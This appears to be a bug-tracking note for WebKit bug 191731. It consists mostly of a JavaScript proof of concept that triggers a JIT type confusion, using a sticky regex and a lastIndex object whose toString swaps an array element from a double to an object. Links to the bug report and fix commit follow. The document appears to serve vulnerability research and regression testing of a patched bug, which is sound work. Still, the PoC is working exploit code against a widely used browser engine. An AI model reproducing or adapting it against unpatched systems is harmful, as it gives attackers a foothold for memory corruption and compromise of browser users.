# BUG 191731
## POC

```javascript
var victim_array = [1.1];
var reg = /abc/y;
var val = 5.2900040263529e-310

var funcToJIT = function() {
    'abc'.match(reg);
    victim_array[0] = val;
}

for (var i = 0; i < 10000; ++i){
    funcToJIT()
}

regexLastIndex = {};
regexLastIndex.toString = function() {
    victim_array[0] = {};
    return "0";
};
reg.lastIndex = regexLastIndex;
funcToJIT()
print(victim_array[0])
```

## About the bug
https://bugs.webkit.org/show_bug.cgi?id=191731
## Diff
https://github.com/WebKit/webkit/commit/7cf9d2911af9f255e0301ea16604c9fa4af340e2?diff=split#diff-fb5fbac6e9d7542468cfeed930e241c0L66
## WebKit branch
3af5ce129e6636350a887d01237a65c2fce77823